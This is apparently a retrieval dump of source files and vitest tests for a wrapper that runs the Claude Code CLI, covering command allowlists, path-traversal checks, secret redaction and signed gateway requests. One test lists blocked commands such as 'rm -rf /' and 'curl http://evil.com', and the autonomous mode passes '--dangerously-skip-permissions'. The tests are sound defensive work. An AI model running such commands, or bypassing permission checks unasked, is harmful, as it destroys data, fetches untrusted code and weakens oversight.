notify gateway\n    this.saveState();\n    updateRunState(this.auth, { workingDir: this.workingDir }).catch(() => {});\n\n    return {\n      success: true,\n      message: `Changed to: ${this.workingDir}`,\n      newDir: this.workingDir\n    };\n  }\n\n  /**\n   * Get current working directory\n   */\n  private getWorkingDirectory(): string {\n    // Return relative path from sandbox root for cleaner display\n    const { relative } = require('path');\n    const sandboxRoot = (this as any).sandboxRoot || this.workingDir;\n    const relPath = relative(sandboxRoot, this.workingDir);\n    return relPath === '.' ? sandboxRoot : relPath;\n  }\n}", "metadata": {"file": "wrapper/src/services/base-runner.ts", "start_line": 801, "end_line": 956, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/claude-runner.test.ts", "location": "wrapper/src/services/claude-runner.test.ts:1", "score": 0.0, "content": "import { describe, it, expect, vi, beforeEach } from 'vitest';\n\n// Mock config\nvi.mock('../config.js', () => ({\n  config: {\n    projectRoot: '/test/project',\n    runsDir: '/test/project/.data/runs',\n    claudeCommand: 'claude',\n    commandPollInterval: 2000,\n    allowlistedCommands: [\n      'npm test',\n      'git diff',\n      'git status',\n      'ls',\n      'ls -la',\n      'ls -l',\n      'ls -a',\n      'll',\n      'dir',\n      'pwd',\n      'cd'\n    ],\n    secretPatterns: [\n      /api[_-]?key[=:]\\s*[\"']?[\\w-]+[\"']?/gi,\n      /password[=:]\\s*[\"']?[\\w-]+[\"']?/gi\n    ]\n  }\n}));\n\n// Mock gateway client\nvi.mock('./gateway-client.js', () => ({\n  sendEvent: vi.fn().mockResolvedValue(undefined),\n  uploadArtifact: vi.fn().mockResolvedValue({ artifactId: 'test-artifact' }),\n  pollCommands: vi.fn().mockResolvedValue([]),\n  ackCommand: vi.fn().mockResolvedValue(undefined)\n}));\n\n// Mock child_process\nvi.mock('child_process', () => ({\n  spawn: vi.fn(),\n  execSync: vi.fn()\n}));\n\n// Mock fs\nvi.mock('fs', () => ({\n  createWriteStream: vi.fn().mockReturnValue({\n    write: vi.fn(),\n    end: vi.fn()\n  }),\n  existsSync: vi.fn().mockReturnValue(true),\n  mkdirSync: vi.fn(),\n  writeFileSync: vi.fn()\n}));\n\nimport { config } from '../config.js';\nimport { redactSecrets } from '../utils/crypto.js';\nimport { parseCdCommand, isPathSafe, getRelativePath } from './claude-runner.js';\n\ndescribe('ClaudeRunner', () => {\n  describe('Command Allowlist', () => {\n    function isCommandAllowed(command: string): boolean {\n      const cmdBase = command.trim();\n      return config.allowlistedCommands.some(allowed =>\n        cmdBase === allowed || cmdBase.startsWith(allowed + ' ')\n      );\n    }\n\n    it('should allow exact command matches', () => {\n      expect(isCommandAllowed('npm test')).toBe(true);\n      expect(isCommandAllowed('git diff')).toBe(true);\n      expect(isCommandAllowed('git status')).toBe(true);\n      expect(isCommandAllowed('ls -la')).toBe(true);\n    });\n\n    it('should allow commands with extra arguments', () => {\n      expect(isCommandAllowed('npm test --coverage')).toBe(true);\n      expect(isCommandAllowed('git diff HEAD~1')).toBe(true);\n      expect(isCommandAllowed('ls -la /tmp')).toBe(true);\n    });\n\n    it('should block non-allowlisted commands', () => {\n      expect(isCommandAllowed('rm -rf /')).toBe(false);\n      expect(isCommandAllowed('curl http://evil.com')).toBe(false);\n      expect(isCommandAllowed('npm install malware')).toBe(false);\n    });\n\n    it('should handle special __STOP__ command', () => {\n      const isStopCommand = (cmd: string) => cmd === '__STOP__';\n      expect(isStopCommand('__STOP__')).toBe(true);\n      expect(isStopCommand('stop')).toBe(false);\n    });\n  });\n\n  describe('Output Processing', () => {\n    it('should handle stdout chunks', () => {\n      const chunks: string[] = [];\n      const onStdout = (data: string) => chunks.push(data);\n\n      onStdout('line 1\\n');\n      onStdout('line 2\\n');\n      onStdout('line 3\\n');\n\n      expect(chunks.length).toBe(3);\n      expect(chunks.join('')).toContain('line 1');\n    });\n\n    it('should handle stderr chunks', () => {\n      const errors: string[] = [];\n      const onStderr = (data: string) => errors.push(data);\n\n      onStderr('error: something went wrong\\n');\n\n      expect(errors.length).toBe(1);\n      expect(errors[0]).toContain('error');\n    });\n\n    it('should redact secrets before sending', () => {\n      const output = 'Loading config... api_key=secret123\\nConnected!';\n      const redacted = redactSecrets(output);\n\n      expect(redacted).not.toContain('secret123');\n      expect(redacted).toContain('[REDACTED]');\n      expect(redacted).toContain('Connected!');\n    });\n  });\n\n  describe('Lifecycle Events', () => {\n    it('should create start marker', () => {\n      const marker = {\n        event: 'started',\n        command: 'test prompt',\n        workingDir: '/project'\n      };\n\n      expect(marker.event).toBe('started');\n      expect(marker.command).toBeDefined();\n      expect(marker.workingDir).toBeDefined();\n    });\n\n    it('should create finish marker with exit code', () => {\n      const successMarker = { event: 'finished', exitCode: 0 };\n      const failMarker = { event: 'finished', exitCode: 1 };\n      const signalMarker = { event: 'finished', exitCode: 128, signal: 'SIGTERM' };\n\n      expect(successMarker.exitCode).toBe(0);\n      expect(failMarker.exitCode).toBe(1);\n      expect(signalMarker.signal).toBe('SIGTERM');\n    });\n  });\n\n  describe('Event Sequencing', () => {\n    it('should increment sequence numbers', () => {\n      let sequence = 0;\n      const getNextSequence = () => ++sequence;\n\n      expect(getNextSequence()).toBe(1);\n      expect(getNextSequence()).toBe(2);\n      expect(getNextSequence()).toBe(3);\n    });\n\n    it('should track events in order', () => {\n      const events: Array<{ seq: number; type: string }> = [];\n      let seq = 0;\n\n      events.push({ seq: ++seq, type: 'marker' }); // started\n      events.push({ seq: ++seq, type: 'stdout' });\n      events.push({ seq: ++seq, type: 'stdout' });\n      events.push({ seq: ++seq, type: 'stderr' });\n      events.push({ seq: ++seq, type: 'marker' }); // finished\n\n      expect(events.length).toBe(5);\n      expect(events[0].type).toBe('marker');\n      expect(events[4].type).toBe('marker');\n      expect(events[events.length - 1].seq).toBe(5);\n    });\n  });\n\n  describe('Stop Handling', () => {\n    it('should track stop requested state', () => {\n      let stopRequested = false;\n      const requestStop = () => { stopRequested = true; };\n      const isStopRequested = () => stopRequested;\n\n      expect(isStopRequested()).toBe(false);\n      requestStop();\n      expect(isStopRequested()).toBe(true);\n    });\n\n    it('should handle graceful vs force stop', () => {\n      let signalSent: string | null = null;\n\n      const sendSignal = (signal: string) => { signalSent = signal; };\n      const scheduleForceKill = (timeout: number) => {\n        return setTimeout(() => sendSignal('SIGKILL'), timeout);\n      };\n\n      // Graceful stop\n      sendSignal('SIGINT');\n      expect(signalSent).toBe('SIGINT');\n", "metadata": {"file": "wrapper/src/services/claude-runner.test.ts", "start_line": 1, "end_line": 200, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/claude-runner.test.ts", "location": "wrapper/src/services/claude-runner.test.ts:201", "score": 0.0, "content": "      // Would schedule force kill\n      const timer = scheduleForceKill(10000);\n      clearTimeout(timer); // Don't actually wait\n    });\n  });\n\n  describe('Log File Handling', () => {\n    it('should construct log path correctly', () => {\n      const runId = 'test-run-123';\n      const runsDir = '/project/.data/runs';\n      const logPath = `${runsDir}/${runId}/claude.log`;\n\n      expect(logPath).toBe('/project/.data/runs/test-run-123/claude.log');\n    });\n\n    it('should format log entries with type prefix', () => {\n      const formatLogEntry = (type: string, data: string) => `[${type}] ${data}`;\n\n      expect(formatLogEntry('stdout', 'output')).toBe('[stdout] output');\n      expect(formatLogEntry('stderr', 'error')).toBe('[stderr] error');\n    });\n  });\n\n  describe('Working Directory', () => {\n    it('should default to process.cwd()', () => {\n      const defaultCwd = process.cwd();\n      expect(defaultCwd).toBeDefined();\n    });\n\n    it('should use provided working directory', () => {\n      const providedCwd = '/custom/path';\n      expect(providedCwd).toBe('/custom/path');\n    });\n\n    it('should reject paths outside project', () => {\n      const isPathSafe = (path: string, projectRoot: string) => {\n        return path.startsWith(projectRoot) && !path.includes('..');\n      };\n\n      expect(isPathSafe('/project/src', '/project')).toBe(true);\n      expect(isPathSafe('/project/../etc', '/project')).toBe(false);\n      expect(isPathSafe('/other/path', '/project')).toBe(false);\n    });\n  });\n});\n\ndescribe('Tmate Assist', () => {\n  it('should parse tmate output for SSH URL', () => {\n    const tmateOutput = `\nTo connect to the session locally, run: tmate -S /tmp/tmate-1000/xxx attach\nssh xyzabc@nyc1.tmate.io\nhttps://tmate.io/t/xyzabc\n    `.trim();\n\n    const sshMatch = tmateOutput.match(/ssh\\s+[\\w@\\.\\-]+/);\n    const webMatch = tmateOutput.match(/https?:\\/\\/[^\\s]+/);\n\n    expect(sshMatch?.[0]).toContain('ssh');\n    expect(webMatch?.[0]).toContain('https://tmate.io');\n  });\n\n  it('should prefer web URL over SSH', () => {\n    const output = 'ssh user@host\\nhttps://web.url/session';\n    const sshMatch = output.match(/ssh\\s+[\\w@\\.\\-]+/);\n    const webMatch = output.match(/https?:\\/\\/[^\\s]+/);\n\n    const sessionUrl = webMatch?.[0] || sshMatch?.[0] || output.trim();\n    expect(sessionUrl).toBe('https://web.url/session');\n  });\n});\n\ndescribe('Command Result Handling', () => {\n  it('should capture git diff output', () => {\n    const diffOutput = `\ndiff --git a/file.txt b/file.txt\nindex 1234567..abcdefg 100644\n--- a/file.txt\n+++ b/file.txt\n@@ -1,3 +1,4 @@\n line 1\n+new line\n line 2\n    `.trim();\n\n    expect(diffOutput).toContain('diff --git');\n    expect(diffOutput).toContain('+new line');\n  });\n\n  it('should handle command timeout', () => {\n    const TIMEOUT_MS = 60000;\n\n    const timedExec = (command: string, timeout: number) => {\n      if (timeout <= 0) {\n        throw new Error('Timeout must be positive');\n      }\n      // In real implementation, execSync with timeout option\n      return { command, timeout };\n    };\n\n    const result = timedExec('npm test', TIMEOUT_MS);\n    expect(result.timeout).toBe(60000);\n  });\n\n  it('should limit result size', () => {\n    const MAX_RESULT_SIZE = 10 * 1024 * 1024; // 10MB\n    const bigResult = 'x'.repeat(15 * 1024 * 1024); // 15MB\n\n    const truncateResult = (result: string, maxSize: number) => {\n      if (result.length > maxSize) {\n        return result.slice(0, maxSize) + '\\n[TRUNCATED]';\n      }\n      return result;\n    };\n\n    const truncated = truncateResult(bigResult, MAX_RESULT_SIZE);\n    expect(truncated.length).toBeLessThan(bigResult.length);\n    expect(truncated).toContain('[TRUNCATED]');\n  });\n});\n\ndescribe('Halt Handling', () => {\n  it('should track halt requested state', () => {\n    let haltRequested = false;\n    const requestHalt = () => { haltRequested = true; };\n    const isHaltRequested = () => haltRequested;\n\n    expect(isHaltRequested()).toBe(false);\n    requestHalt();\n    expect(isHaltRequested()).toBe(true);\n  });\n\n  it('should send SIGKILL immediately on halt', () => {\n    let signalSent: string | null = null;\n    const sendSignal = (signal: string) => { signalSent = signal; };\n\n    // Halt should send SIGKILL immediately\n    sendSignal('SIGKILL');\n    expect(signalSent).toBe('SIGKILL');\n  });\n\n  it('should handle __HALT__ special command', () => {\n    const isHaltCommand = (cmd: string) => cmd === '__HALT__';\n    expect(isHaltCommand('__HALT__')).toBe(true);\n    expect(isHaltCommand('halt')).toBe(false);\n    expect(isHaltCommand('__halt__')).toBe(false);\n  });\n});\n\ndescribe('Input Handling', () => {\n  it('should handle __INPUT__ special command', () => {\n    const isInputCommand = (cmd: string) => cmd.startsWith('__INPUT__:');\n    expect(isInputCommand('__INPUT__:hello')).toBe(true);\n    expect(isInputCommand('__INPUT__:yes\\n')).toBe(true);\n    expect(isInputCommand('__INPUT__')).toBe(false);\n    expect(isInputCommand('input')).toBe(false);\n  });\n\n  it('should extract input data from __INPUT__ command', () => {\n    const extractInput = (cmd: string) => {\n      if (cmd.startsWith('__INPUT__:')) {\n        return cmd.substring('__INPUT__:'.length);\n      }\n      return null;\n    };\n\n    expect(extractInput('__INPUT__:hello')).toBe('hello');\n    expect(extractInput('__INPUT__:yes\\n')).toBe('yes\\n');\n    expect(extractInput('__INPUT__:')).toBe('');\n    expect(extractInput('other')).toBe(null);\n  });\n\n  it('should write input to stdin', () => {\n    const writes: string[] = [];\n    const mockStdin = {\n      write: (data: string) => { writes.push(data); return true; }\n    };\n\n    const sendInput = (data: string) => mockStdin.write(data);\n\n    expect(sendInput('hello')).toBe(true);\n    expect(sendInput('world\\n')).toBe(true);\n    expect(writes).toEqual(['hello', 'world\\n']);\n  });\n});\n\ndescribe('Escape Handling', () => {\n  it('should handle __ESCAPE__ special command', () => {\n    const isEscapeCommand = (cmd: string) => cmd === '__ESCAPE__';\n    expect(isEscapeCommand('__ESCAPE__')).toBe(true);\n    expect(isEscapeCommand('escape')).toBe(false);\n  });\n\n  it('should send SIGINT on escape', () => {\n    let signalSent: string | null = null;\n    const sendSignal = (signal: string) => { signalSent = signal; return true; };\n\n    const sendEscape = () => sendSignal('SIGINT');\n\n    expect(sendEscape()).toBe(true);\n    expect(signalSent).toBe('SIGINT');", "metadata": {"file": "wrapper/src/services/claude-runner.test.ts", "start_line": 201, "end_line": 400, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/claude-runner.test.ts", "location": "wrapper/src/services/claude-runner.test.ts:401", "score": 0.0, "content": "  });\n});\n\ndescribe('State Management', () => {\n  it('should track runner state', () => {\n    const state = {\n      runId: 'test-run-123',\n      isRunning: false,\n      sequence: 0,\n      workingDir: '/home/user/project',\n      autonomous: false,\n      stopRequested: false\n    };\n\n    expect(state.runId).toBe('test-run-123');\n    expect(state.isRunning).toBe(false);\n    expect(state.autonomous).toBe(false);\n  });\n\n  it('should save state to JSON', () => {\n    const state = {\n      runId: 'test-123',\n      sequence: 42,\n      workingDir: '/home/user',\n      autonomous: true,\n      savedAt: Date.now()\n    };\n\n    const json = JSON.stringify(state, null, 2);\n    const parsed = JSON.parse(json);\n\n    expect(parsed.runId).toBe('test-123');\n    expect(parsed.sequence).toBe(42);\n    expect(parsed.autonomous).toBe(true);\n  });\n\n  it('should load state from JSON', () => {\n    const savedState = JSON.stringify({\n      runId: 'test-456',\n      sequence: 10,\n      workingDir: '/project',\n      autonomous: false\n    });\n\n    const loaded = JSON.parse(savedState);\n    expect(loaded.sequence).toBe(10);\n  });\n\n  it('should construct state file path', () => {\n    const runId = 'test-run';\n    const runsDir = '/project/.data/runs';\n    const stateFile = `${runsDir}/${runId}/state.json`;\n\n    expect(stateFile).toBe('/project/.data/runs/test-run/state.json');\n  });\n});\n\ndescribe('Autonomous Mode', () => {\n  it('should set autonomous flag in options', () => {\n    const options = {\n      runId: 'test-123',\n      capabilityToken: 'token-abc',\n      workingDir: '/project',\n      autonomous: true\n    };\n\n    expect(options.autonomous).toBe(true);\n  });\n\n  it('should use different args for autonomous mode', () => {\n    const buildArgs = (autonomous: boolean, command?: string) => {\n      if (autonomous) {\n        return ['--dangerously-skip-permissions'];\n      } else if (command) {\n        return [command];\n      }\n      return [];\n    };\n\n    expect(buildArgs(true)).toEqual(['--dangerously-skip-permissions']);\n    expect(buildArgs(false, 'test prompt')).toEqual(['test prompt']);\n    expect(buildArgs(false)).toEqual([]);\n  });\n\n  it('should set different TERM for autonomous mode', () => {\n    const getTermEnv = (autonomous: boolean) => {\n      return autonomous ? 'xterm-256color' : 'dumb';\n    };\n\n    expect(getTermEnv(true)).toBe('xterm-256color');\n    expect(getTermEnv(false)).toBe('dumb');\n  });\n\n  it('should include autonomous flag in start marker', () => {\n    const marker = {\n      event: 'started',\n      command: 'claude (autonomous mode)',\n      workingDir: '/project',\n      autonomous: true,\n      resumedFrom: undefined\n    };\n\n    expect(marker.autonomous).toBe(true);\n    expect(marker.command).toContain('autonomous');\n  });\n});\n\ndescribe('Resume Functionality', () => {\n  it('should track resumeFrom option', () => {\n    const options = {\n      runId: 'new-run-123',\n      capabilityToken: 'token-xyz',\n      resumeFrom: 'old-run-456'\n    };\n\n    expect(options.resumeFrom).toBe('old-run-456');\n  });\n\n  it('should include resumedFrom in start marker', () => {\n    const marker = {\n      event: 'started',\n      command: 'continue task',\n      workingDir: '/project',\n      autonomous: false,\n      resumedFrom: 'previous-run-id'\n    };\n\n    expect(marker.resumedFrom).toBe('previous-run-id');\n  });\n\n  it('should load previous sequence number on resume', () => {\n    const savedState = { sequence: 42 };\n    let currentSequence = 0;\n\n    // Load state on resume\n    currentSequence = savedState.sequence;\n\n    expect(currentSequence).toBe(42);\n  });\n});\n\ndescribe('Heartbeat', () => {\n  it('should update state periodically', () => {\n    const updates: number[] = [];\n    let sequence = 0;\n\n    const updateState = () => {\n      sequence++;\n      updates.push(sequence);\n    };\n\n    // Simulate 3 heartbeats\n    updateState();\n    updateState();\n    updateState();\n\n    expect(updates).toEqual([1, 2, 3]);\n  });\n\n  it('should save state on each heartbeat', () => {\n    const saves: object[] = [];\n\n    const saveState = (state: object) => {\n      saves.push(state);\n    };\n\n    saveState({ sequence: 1, savedAt: Date.now() });\n    saveState({ sequence: 2, savedAt: Date.now() });\n\n    expect(saves.length).toBe(2);\n  });\n});\n\ndescribe('Finish Marker Enhancement', () => {\n  it('should include stop/halt flags in finish marker', () => {\n    const createFinishMarker = (exitCode: number, opts: {\n      signal?: string;\n      stopRequested?: boolean;\n      haltRequested?: boolean;\n    }) => ({\n      event: 'finished',\n      exitCode,\n      signal: opts.signal,\n      stopRequested: opts.stopRequested || false,\n      haltRequested: opts.haltRequested || false\n    });\n\n    const normalExit = createFinishMarker(0, {});\n    expect(normalExit.stopRequested).toBe(false);\n    expect(normalExit.haltRequested).toBe(false);\n\n    const stoppedRun = createFinishMarker(130, { signal: 'SIGINT', stopRequested: true });\n    expect(stoppedRun.stopRequested).toBe(true);\n    expect(stoppedRun.signal).toBe('SIGINT');\n\n    const haltedRun = createFinishMarker(137, { signal: 'SIGKILL', haltRequested: true });\n    expect(haltedRun.haltRequested).toBe(true);\n    expect(haltedRun.signal).toBe('SIGKILL');\n  });\n});", "metadata": {"file": "wrapper/src/services/claude-runner.test.ts", "start_line": 401, "end_line": 600, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/claude-runner.test.ts", "location": "wrapper/src/services/claude-runner.test.ts:601", "score": 0.0, "content": "\ndescribe('Directory Navigation Commands', () => {\n  it('should allow cd command', () => {\n    const isCommandAllowed = (command: string): boolean => {\n      return ['cd', 'ls', 'ls -la', 'ls -l', 'ls -a', 'll', 'dir', 'pwd'].some(allowed =>\n        command === allowed || command.startsWith(allowed + ' ')\n      );\n    };\n\n    expect(isCommandAllowed('cd')).toBe(true);\n    expect(isCommandAllowed('cd src')).toBe(true);\n    expect(isCommandAllowed('cd ..')).toBe(true);\n    expect(isCommandAllowed('cd /absolute/path')).toBe(true);\n  });\n\n  it('should allow ls command variants', () => {\n    const isCommandAllowed = (command: string): boolean => {\n      return ['cd', 'ls', 'ls -la', 'ls -l', 'ls -a', 'll', 'dir', 'pwd'].some(allowed =>\n        command === allowed || command.startsWith(allowed + ' ')\n      );\n    };\n\n    expect(isCommandAllowed('ls')).toBe(true);\n    expect(isCommandAllowed('ls -la')).toBe(true);\n    expect(isCommandAllowed('ls -l')).toBe(true);\n    expect(isCommandAllowed('ls -a')).toBe(true);\n    expect(isCommandAllowed('ll')).toBe(true);\n    expect(isCommandAllowed('dir')).toBe(true);\n    expect(isCommandAllowed('ls /path')).toBe(true);\n  });\n\n  it('should allow pwd command', () => {\n    const isCommandAllowed = (command: string): boolean => {\n      return ['cd', 'ls', 'ls -la', 'ls -l', 'ls -a', 'll', 'dir', 'pwd'].some(allowed =>\n        command === allowed || command.startsWith(allowed + ' ')\n      );\n    };\n\n    expect(isCommandAllowed('pwd')).toBe(true);\n  });\n\n  it('should validate cd command format', () => {\n    expect(parseCdCommand('cd src')).toBe('src');\n    expect(parseCdCommand('cd  src  ')).toBe('src');\n    expect(parseCdCommand('cd')).toBe('');\n    expect(parseCdCommand('ls src')).toBe(null);\n  });\n\n  it('should validate directory path safety', () => {\n    expect(isPathSafe('src', '/project')).toBe(true);\n    expect(isPathSafe('src/components', '/project')).toBe(true);\n    expect(isPathSafe('../other', '/project')).toBe(false);\n    expect(isPathSafe('/etc', '/project')).toBe(false);\n    expect(isPathSafe('../../..', '/project/src')).toBe(false);\n  });\n\n  it('should handle relative path to working directory', () => {\n    expect(getRelativePath('/project', '/project')).toBe('/project');\n    expect(getRelativePath('/project/src', '/project')).toBe('src');\n    expect(getRelativePath('/project/src/components', '/project')).toBe('src/components');\n    expect(getRelativePath('/project/../project', '/project')).toBe('/project');\n  });\n});", "metadata": {"file": "wrapper/src/services/claude-runner.test.ts", "start_line": 601, "end_line": 663, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/claude-runner.ts", "location": "wrapper/src/services/claude-runner.ts:1", "score": 0.0, "content": "import { BaseRunner, RunnerOptions, WorkerCommandResult } from './base-runner.js';\nimport { config } from '../config.js';\nimport { existsSync, mkdirSync, writeFileSync, readFileSync } from 'fs';\nimport { join, resolve as pathResolve, relative as pathRelative, normalize as pathNormalize } from 'path';\n\n// Re-export RunnerOptions for convenience\nexport type { RunnerOptions };\n\nexport interface ClaudeRunnerOptions extends RunnerOptions {\n  // No Claude-specific options needed currently\n}\n\n/**\n * Claude Code runner implementation\n * Extends BaseRunner with Claude-specific command building\n */\nexport class ClaudeRunner extends BaseRunner {\n  constructor(options: ClaudeRunnerOptions) {\n    super(options);\n\n    // Override log path to maintain backward compatibility\n    const runDir = join(config.runsDir, options.runId);\n    if (!existsSync(runDir)) {\n      mkdirSync(runDir, { recursive: true });\n    }\n    (this as any).logPath = join(runDir, 'claude.log');\n    (this as any).stateFile = join(runDir, 'state.json');\n  }\n\n  /**\n   * Get the worker type identifier\n   */\n  getWorkerType(): string {\n    return 'claude';\n  }\n\n  /**\n   * Get the CLI command for Claude\n   */\n  getCommand(): string {\n    return config.claudeCommand;\n  }\n\n  /**\n   * Build Claude command arguments based on mode\n   */\n  buildCommand(command?: string, autonomous?: boolean): WorkerCommandResult {\n    let claudeArgs: string[] = [];\n    let fullCommand: string;\n\n    if (autonomous) {\n      // Autonomous mode: no prompt, just start Claude in interactive mode\n      // Use --dangerously-skip-permissions if available for full autonomy\n      claudeArgs = ['--dangerously-skip-permissions'];\n      fullCommand = `${this.getCommand()} (autonomous mode)`;\n    } else if (command) {\n      claudeArgs = [command];\n      fullCommand = `${this.getCommand()} ${claudeArgs.join(' ')}`.trim();\n    } else {\n      // Interactive mode without prompt\n      fullCommand = this.getCommand();\n    }\n\n    return { args: claudeArgs, fullCommand };\n  }\n\n  /**\n   * Build the start marker with Claude-specific data\n   */\n  protected buildStartMarker(command: string): Record<string, any> {\n    return {\n      ...super.buildStartMarker(command),\n      workerType: 'claude'\n    };\n  }\n\n  /**\n   * Get current run state (backward compatible method)\n   */\n  getState() {\n    return super.getState();\n  }\n\n  /**\n   * Save state to disk (backward compatible)\n   */\n  protected saveState(): void {\n    const state = {\n      runId: this.auth.runId,\n      sequence: this.sequence,\n      workingDir: this.workingDir,\n      autonomous: this.autonomous,\n      savedAt: Date.now()\n    };\n    try {\n      writeFileSync((this as any).stateFile, JSON.stringify(state, null, 2));\n    } catch (err) {\n      console.error('Failed to save state:', err);\n    }\n  }\n\n  /**\n   * Load state from disk (backward compatible)\n   */\n  protected loadState(): boolean {\n    try {\n      if (existsSync((this as any).stateFile)) {\n        const data = readFileSync((this as any).stateFile, 'utf8');\n        const state = JSON.parse(data);\n        this.sequence = state.sequence || 0;\n        return true;\n      }\n    } catch (err) {\n      console.error('Failed to load state:', err);\n    }\n    return false;\n  }\n}\n\n/**\n * Parse a cd command and extract the target directory\n * Returns null if not a cd command, empty string for bare 'cd', or the trimmed path\n */\nexport function parseCdCommand(command: string): string | null {\n  if (!command.startsWith('cd')) {\n    return null;\n  }\n  // Check if it's exactly 'cd' (bare cd)\n  if (command === 'cd') {\n    return '';\n  }\n  // Must have space after 'cd'\n  if (!command.startsWith('cd ')) {\n    return null;\n  }\n  return command.substring(3).trim();\n}\n\n/**\n * Validate that a path stays within the sandbox root\n * Prevents directory traversal attacks\n */\nexport function isPathSafe(path: string, sandboxRoot: string): boolean {\n  try {\n    // Normalize paths first to handle both POSIX and Windows formats\n    const normalizedRoot = pathNormalize(sandboxRoot);\n    const normalizedPath = pathNormalize(path);\n\n    // Resolve the path relative to the sandbox root\n    const resolved = pathResolve(normalizedRoot, normalizedPath);\n    const normalizedResolved = pathNormalize(resolved);\n\n    // Normalize the root as well\n    const normalizedRootResolved = pathNormalize(pathResolve(normalizedRoot));\n\n    // Convert both to forward slashes for consistent comparison\n    const resolvedForComparison = normalizedResolved.replace(/\\\\/g, '/').toLowerCase();\n    const rootForComparison = normalizedRootResolved.replace(/\\\\/g, '/').toLowerCase();\n\n    // Check if resolved path is within the sandbox\n    // This works even if paths have different drive letters or are POSIX vs Windows\n    return (\n      resolvedForComparison === rootForComparison ||\n      resolvedForComparison.startsWith(rootForComparison + '/')\n    );\n  } catch {\n    return false;\n  }\n}\n\n/**\n * Get the relative path from root, or return root if at root\n */\nexport function getRelativePath(current: string, root: string): string {\n  try {\n    // Normalize both paths for comparison\n    const normalizedRoot = pathNormalize(root);\n    const normalizedCurrent = pathNormalize(current);\n\n    const rel = pathRelative(normalizedRoot, normalizedCurrent);\n\n    // If relative path is empty or '.', we're at the root - return original root path\n    if (!rel || rel === '.') {\n      return root;\n    }\n    // Convert backslashes to forward slashes for consistency\n    return rel.replace(/\\\\/g, '/');\n  } catch {\n    return '';\n  }\n}", "metadata": {"file": "wrapper/src/services/claude-runner.ts", "start_line": 1, "end_line": 191, "language": "ts"}}, {"corpus": "code", "source": "wrapper/src/services/gateway-client.test.ts", "location": "wrapper/src/services/gateway-client.test.ts:1", "score": 0.0, "content": "import { describe, it, expect, vi, beforeEach } from 'vitest';\n\n// Mock config\nvi.mock('../config.js', () => ({\n  config: {\n    gatewayUrl: 'https://localhost:3100',\n    hmacSecret: 'test-secret-key-that-is-long-enough',\n    allowSelfSignedCerts: true,\n    secretPatterns: []\n  }\n}));\n\n// Mock fetch\nconst mockFetch = vi.fn();\nvi.stubGlobal('fetch', mockFetch);\n\nimport { createSignature, hashBody, generateNonce } from '../utils/crypto.js';\n\ndescribe('Gateway Client', () => {\n  beforeEach(() => {\n    mockFetch.mockReset();\n  });\n\n  describe('Request Signing', () => {\n    it('should generate all required headers', () => {\n      const timestamp = Math.floor(Date.now() / 1000);\n      const nonce = generateNonce();\n      const body = '{\"type\":\"stdout\",\"data\":\"test\"}';\n      const bodyHash = hashBody(body);\n\n      const headers: Record<string, string> = {\n        'Content-Type': 'application/json',\n        'X-Timestamp': timestamp.toString(),\n        'X-Nonce': nonce\n      };\n\n      // Add signature\n      headers['X-Signature'] = createSignature({\n        method: 'POST',\n        path: '/api/ingest/event',\n        bodyHash,\n        timestamp,\n        nonce\n      });\n\n      expect(headers['X-Timestamp']).toBeDefined();\n      expect(headers['X-Nonce']).toBeDefined();\n      expect(headers['X-Signature']).toBeDefined();\n      expect(headers['X-Signature']).toMatch(/^[a-f0-9]{64}$/);\n    });\n\n    it('should include run auth headers when provided', () => {\n      const timestamp = Math.floor(Date.now() / 1000);\n      const nonce = generateNonce();\n      const runId = 'test-run-id';\n      const capabilityToken = 'test-cap-token';\n\n      const headers: Record<string, string> = {\n        'X-Timestamp': timestamp.toString(),\n        'X-Nonce': nonce,\n        'X-Run-Id': runId,\n        'X-Capability-Token': capabilityToken\n      };\n\n      headers['X-Signature'] = createSignature({\n        method: 'POST',\n        path: '/api/ingest/event',\n        bodyHash: hashBody(''),\n        timestamp,\n        nonce,\n        runId,\n        capabilityToken\n      });\n\n      expect(headers['X-Run-Id']).toBe(runId);\n      expect(headers['X-Capability-Token']).toBe(capabilityToken);\n    });\n  });\n\n  describe('Event Types', () => {\n    const validEventTypes = ['stdout', 'stderr', 'marker', 'info', 'error', 'assist'];\n\n    it('should accept all valid event types', () => {\n      for (const type of validEventTypes) {\n        const event = { type, data: 'test data', sequence: 1 };\n        expect(event.type).toBe(type);\n      }\n    });\n\n    it('should structure marker events correctly', () => {\n      const startMarker = {\n        type: 'marker',\n        data: JSON.stringify({ event: 'started', command: 'npm test' })\n      };\n\n      const finishMarker = {\n        type: 'marker',\n        data: JSON.stringify({ event: 'finished', exitCode: 0 })\n      };\n\n      expect(JSON.parse(startMarker.data).event).toBe('started');\n      expect(JSON.parse(finishMarker.data).exitCode).toBe(0);\n    });\n\n    it('should structure assist events correctly', () => {\n      const assistEvent = {\n        type: 'assist',\n        data: JSON.stringify({ type: 'tmate', url: 'ssh user@host' })\n      };\n\n      const parsed = JSON.parse(assistEvent.data);\n      expect(parsed.type).toBe('tmate');\n      expect(parsed.url).toBeDefined();\n    });\n  });\n\n  describe('Command Handling', () => {\n    it('should parse command response', () => {\n      const response = [\n        { id: 'cmd-1', command: 'npm test', created_at: 1234567890 },\n        { id: 'cmd-2', command: 'git diff', created_at: 1234567891 }\n      ];\n\n      expect(response.length).toBe(2);\n      expect(response[0].command).toBe('npm test');\n      expect(response[1].id).toBe('cmd-2');\n    });\n\n    it('should structure ack request correctly', () => {\n      const successAck = { result: 'Test passed\\n5 tests, 0 failures' };\n      const errorAck = { error: 'Command failed with exit code 1' };\n\n      expect(successAck.result).toBeDefined();\n      expect(successAck).not.toHaveProperty('error');\n      expect(errorAck.error).toBeDefined();\n      expect(errorAck).not.toHaveProperty('result');\n    });\n  });\n\n  describe('Error Handling', () => {\n    it('should handle HTTP error responses', async () => {\n      mockFetch.mockResolvedValueOnce({\n        ok: false,\n        status: 401,\n        json: async () => ({ error: 'Invalid signature' })\n      });\n\n      const response = await mockFetch('https://localhost:3100/api/test');\n      expect(response.ok).toBe(false);\n\n      const error = await response.json();\n      expect(error.error).toBe('Invalid signature');\n    });\n\n    it('should handle network errors', async () => {\n      mockFetch.mockRejectedValueOnce(new Error('Network error'));\n\n      try {\n        await mockFetch('https://localhost:3100/api/test');\n        expect.fail('Should have thrown');\n      } catch (err: any) {\n        expect(err.message).toBe('Network error');\n      }\n    });\n\n    it('should handle timeout', async () => {\n      mockFetch.mockImplementationOnce(() =>\n   